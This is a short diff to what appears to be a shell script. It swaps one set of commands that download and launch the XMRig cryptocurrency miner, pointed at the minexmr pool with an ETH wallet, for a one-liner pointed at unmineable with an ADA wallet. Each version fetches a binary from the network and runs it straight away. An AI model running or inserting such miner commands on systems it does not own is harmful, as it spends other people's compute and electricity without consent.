@@ -1,5 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-ls
-cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u ETH:0x64a799F4b466E744140AE14708A8cC682DC30Fd0 -k --tls --rig-id rig
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ADA:addr1v9uj3ratlw0pg72e85vdth0zvx3qk4tjua8n09m65tt8gac9h5g27.pc01 -p x
